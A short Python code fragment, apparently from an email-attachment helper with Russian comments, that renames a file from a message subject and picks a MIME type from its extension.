        mime_type = "application/pdf"
        return file_content, filename, mime_type
    
    # Если subject передан, переименовываем файл в соответствии с темой
    if subject:
        # Определяем расширение из оригинального файла
        file_ext = os.path.splitext(original_filename)[1] or ".pdf"
        # Генерируем новое имя на основе темы с правильным расширением
        new_filename = get_filename_by_subject(subject, company_name, file_type, attachment_index, file_ext)
        original_filename = new_filename
    
    # Определяем MIME тип по расширению
    if original_filename.endswith('.pdf'):
        mime_type = "application/pdf"
    elif original_filename.endswith('.xlsx') or original_filename.endswith('.xls'):
        mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    elif original_filename.endswith('.docx') or original_filename.endswith('.doc'):
        mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    elif original_filename.endswith('.zip'):
        mime_type = "application/zip"
    else:
        mime_type = "application/octet-stream"
    
    return file_content, original_filename, mime_type